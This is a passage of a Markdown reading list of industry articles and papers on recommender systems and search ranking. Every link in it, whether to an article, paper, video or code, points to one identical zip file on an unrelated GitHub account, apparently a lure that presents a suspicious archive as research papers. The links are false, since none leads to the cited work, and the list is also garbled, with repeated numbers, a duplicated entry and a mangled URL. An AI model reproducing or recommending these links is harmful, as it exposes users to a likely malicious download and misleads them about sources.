21. [Talent Search and Recommendation Systems at LinkedIn: Practical Challenges and Lessons Learned](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `LinkedIn` `2018`
21. [Behavior Sequence Transformer for E-commerce Recommendation in Alibaba](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2019`
22. [SDM: Sequential Deep Matching Model for Online Large-scale Recommender System](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2019`
23. [Multi-Interest Network with Dynamic Routing for Recommendation at Tmall](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2019`
24. [Personalized Recommendations for Experiences Using Deep Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `TripAdvisor` `2019`
25. [Powered by AI: Instagram’s Explore recommender system](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Facebook` `2019`
26. [Marginal Posterior Sampling for Slate Bandits](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Netflix` `2019`
27. [Food Discovery with Uber Eats: Using Graph Learning to Power Recommendations](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2019`
28. [Music recommendation at Spotify](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip%20Friday%20-%20Music%20Recommendation%20at%20Spotify%20-%20Ben%https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Spotify` `2019`
29. [Using Machine Learning to Predict what File you Need Next (Part 1)](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Dropbox` `2019`
30. [Using Machine Learning to Predict what File you Need Next (Part 2)](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Dropbox` `2019`
31. [Learning to be Relevant: Evolution of a Course Recommendation System](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) (**PAPER NEEDED**)`LinkedIn` `2019`
32. [Temporal-Contextual Recommendation in Real-Time](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Amazon` `2020`
33. [P-Companion: A Framework for Diversified Complementary Product Recommendation](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Amazon` `2020`
34. [Deep Interest with Hierarchical Attention Network for Click-Through Rate Prediction](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2020`
35. [TPG-DNN: A Method for User Intent Prediction with Multi-task Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2020`
36. [PURS: Personalized Unexpected Recommender System for Improving User Satisfaction](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2020`
37. [Controllable Multi-Interest Framework for Recommendation](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2020`
38. [MiNet: Mixed Interest Network for Cross-Domain Click-Through Rate Prediction](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2020`
39. [ATBRG: Adaptive Target-Behavior Relational Graph Network for Effective Recommendation](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2020`
40. [For Your Ears Only: Personalizing Spotify Home with Machine Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Spotify` `2020`
41. [Reach for the Top: How Spotify Built Shortcuts in Just Six Months](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Spotify` `2020`
42. [Contextual and Sequential User Embeddings for Large-Scale Music Recommendation](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Spotify` `2020`
43. [The Evolution of Kit: Automating Marketing Using Machine Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Shopify` `2020`
44. [A Closer Look at the AI Behind Course Recommendations on LinkedIn Learning (Part 1)](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2020`
45. [A Closer Look at the AI Behind Course Recommendations on LinkedIn Learning (Part 2)](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2020`
46. [Building a Heterogeneous Social Network Recommendation System](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2020`
47. [How TikTok recommends videos #ForYou](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `ByteDance` `2020`
48. [Zero-Shot Heterogeneous Transfer Learning from RecSys to Cold-Start Search Retrieval](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2020`
49. [Improved Deep & Cross Network for Feature Cross Learning in Web-scale LTR Systems](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2020`
50. [Mixed Negative Sampling for Learning Two-tower Neural Networks in Recommendations](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2020`
51. [Future Data Helps Training: Modeling Future Contexts for Session-based Recommendation](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Tencent` `2020`
52. [A Case Study of Session-based Recommendations in the Home-improvement Domain](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Home Depot` `2020`
53. [Balancing Relevance and Discovery to Inspire Customers in the IKEA App](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Ikea` `2020`
54. [How we use AutoML, Multi-task learning and Multi-tower models for Pinterest Ads](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Pinterest` `2020`
55. [Multi-task Learning for Related Products Recommendations at Pinterest](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Pinterest` `2020`
56. [Improving the Quality of Recommended Pins with Lightweight Ranking](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Pinterest` `2020`
57. [Multi-task Learning and Calibration for Utility-based Home Feed Ranking](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Pinterest` `2020`
57. [Personalized Cuisine Filter Based on Customer Preference and Local Popularity](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2020`
58. [How We Built a Matchmaking Algorithm to Cross-Sell Products](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Gojek` `2020`
59. [Lessons Learned Addressing Dataset Bias in Model-Based Candidate Generation](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Twitter` `2021`
60. [Self-supervised Learning for Large-scale Item Recommendations](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2021`
61. [Deep Retrieval: End-to-End Learnable Structure Model for Large-Scale Recommendations](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `ByteDance` `2021`
62. [Using AI to Help Health Experts Address the COVID-19 Pandemic](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Facebook` `2021`
63. [Advertiser Recommendation Systems at Pinterest](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Pinterest` `2021`
64. [On YouTube's Recommendation System](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `YouTube` `2021`
65. ["Are you sure?": Preliminary Insights from Scaling Product Comparisons to Multiple Shops](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Coveo` `2021`
66. [Mozrt, a Deep Learning Recommendation System Empowering Walmart Store Associates](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Walmart` `2021`
67. [Understanding Data Storage and Ingestion for Large-Scale Deep Recommendation Model Training](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Meta` `2021`
67. [The Amazon Music conversational recommender is hitting the right notes](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Amazon` `2022`
68. [Personalized complementary product recommendation](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Amazon` `2022`
69. [Building a Deep Learning Based Retrieval System for Personalized Recommendations](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `eBay` `2022`
70. [How We Built: An Early-Stage Machine Learning Model for Recommendations](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Peloton` `2022`
71. [Lessons Learned from Building out Context-Aware Recommender Systems](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Peloton` `2022`
72. [Beyond Matrix Factorization: Using hybrid features for user-business recommendations](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Yelp` `2022`
73. [Improving job matching with machine-learned activity features](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2022`
74. [Understanding Data Storage and Ingestion for Large-Scale Deep Recommendation Model Training](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Meta` `2022`
75. [Blueprints for recommender system architectures: 10th anniversary edition](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Xavier Amatriain` `2022`
76. [How Pinterest Leverages Realtime User Actions in Recommendation to Boost Homefeed Engagement Volume](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Pinterest` `2022`
77. [RecSysOps: Best Practices for Operating a Large-Scale Recommender System](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2022`
78. [Recommend API: Unified end-to-end machine learning infrastructure to generate recommendations](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Slack` `2022`
79. [Evolving DoorDash’s Substitution Recommendations Algorithm](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2022`
80. [Homepage Recommendation with Exploitation and Exploration](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2022`
81. [GPU-accelerated ML Inference at Pinterest](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Pinterest` `2022`
82. [Addressing Confounding Feature Issue for Causal Recommendation](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Tencent` `2022`


## Search & Ranking
1. [Amazon Search: The Joy of Ranking Products](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Video](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Amazon` `2016`
2. [How Lazada Ranks Products to Improve Customer Experience and Conversion](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Lazada` `2016`
3. [Ranking Relevance in Yahoo Search](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Yahoo` `2016`
4. [Learning to Rank Personalized Search Results in Professional Networks](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `LinkedIn` `2016`
5. [Using Deep Learning at Scale in Twitter’s Timelines](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Twitter` `2017`
6. [An Ensemble-based Approach to Click-Through Rate Prediction for Promoted Listings at Etsy](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Etsy` `2017`
7. [Powering Search & Recommendations at DoorDash](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2017`
8. [Applying Deep Learning To Airbnb Search](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Airbnb` `2018`
9. [In-session Personalization for Talent Search](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `LinkedIn` `2018`
10. [Talent Search and Recommendation Systems at LinkedIn](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `LinkedIn` `2018`
11. [Food Discovery with Uber Eats: Building a Query Understanding Engine](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2018`
12. [Globally Optimized Mutual Influence Aware Ranking in E-Commerce Search](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2018`
13. [Reinforcement Learning to Rank in E-Commerce Search Engine](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2018`
14. [Semantic Product Search](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Amazon` `2019`
15. [Machine Learning-Powered Search Ranking of Airbnb Experiences](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2019`
16. [Entity Personalized Talent Search Models with Tree Interaction Features](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `LinkedIn` `2019`
17. [The AI Behind LinkedIn Recruiter Search and recommendation systems](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2019`
18. [Learning Hiring Preferences: The AI Behind LinkedIn Jobs](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2019`
19. [The Secret Sauce Behind Search Personalisation](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Gojek` `2019`
20. [Neural Code Search: ML-based Code Search Using Natural Language Queries](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Facebook` `2019`
21. [Aggregating Search Results from Heterogeneous Sources via Reinforcement Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2019`
22. [Cross-domain Attention Network with Wasserstein Regularizers for E-commerce Search](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Alibaba` `2019`
23. [Understanding Searches Better Than Ever Before](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2019`
24. [How We Used Semantic Search to Make Our Search 10x Smarter](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Tokopedia` `2019`
25. [Query2vec: Search query expansion with query embeddings](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `GrubHub` `2019`
26. [MOBIUS: Towards the Next Generation of Query-Ad Matching in Baidu’s Sponsored Search](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Baidu` `2019`
27. [Why Do People Buy Seemingly Irrelevant Items in Voice Product Search?](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Amazon` `2020`
28. [Managing Diversity in Airbnb Search](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Airbnb` `2020`
29. [Improving Deep Learning for Airbnb Search](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Airbnb` `2020`
30. [Quality Matches Via Personalized AI for Hirer and Seeker Preferences](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2020`
31. [Understanding Dwell Time to Improve LinkedIn Feed Ranking](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2020`
32. [Ads Allocation in Feed via Constrained Optimization](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Video](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `LinkedIn` `2020`
33. [Understanding Dwell Time to Improve LinkedIn Feed Ranking](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2020`
34. [AI at Scale in Bing](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Microsoft` `2020`
35. [Query Understanding Engine in Traveloka Universal Search](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Traveloka` `2020`
36. [Bayesian Product Ranking at Wayfair](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Wayfair` `2020`
37. [COLD: Towards the Next Generation of Pre-Ranking System](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2020`
38. [Shop The Look: Building a Large Scale Visual Shopping System at Pinterest](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Video](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Pinterest` `2020`
39. [Driving Shopping Upsells from Pinterest Search](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Pinterest` `2020`
40. [GDMix: A Deep Ranking Personalization Framework](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `LinkedIn` `2020`
41. [Bringing Personalized Search to Etsy](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Etsy` `2020`
42. [Building a Better Search Engine for Semantic Scholar](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Allen Institute for AI` `2020`
43. [Query Understanding for Natural Language Enterprise Search](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Salesforce` `2020`
44. [Things Not Strings: Understanding Search Intent with Better Recall](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2020`
45. [Query Understanding for Surfacing Under-served Music Content](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Spotify` `2020`
46. [Embedding-based Retrieval in Facebook Search](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Facebook` `2020`
47. [Towards Personalized and Semantic Retrieval for E-commerce Search via Embedding Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `JD` `2020`
48. [QUEEN: Neural query rewriting in e-commerce](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Amazon` `2021`
49. [Using Learning-to-rank to Precisely Locate Where to Deliver Packages](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Amazon` `2021`
50. [Seasonal relevance in e-commerce search](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Amazon` `2021`
51. [Graph Intention Network for Click-through Rate Prediction in Sponsored Search](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2021`
52. [How We Built A Context-Specific Bidding System for Etsy Ads](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Etsy` `2021`
53. [Pre-trained Language Model based Ranking in Baidu Search](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Baidu` `2021`
54. [Stitching together spaces for query-based recommendations](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Stitch Fix` `2021`
55. [Deep Natural Language Processing for LinkedIn Search Systems](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `LinkedIn` `2021`
56. [Siamese BERT-based Model for Web Search Relevance Ranking](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Seznam` `2021`
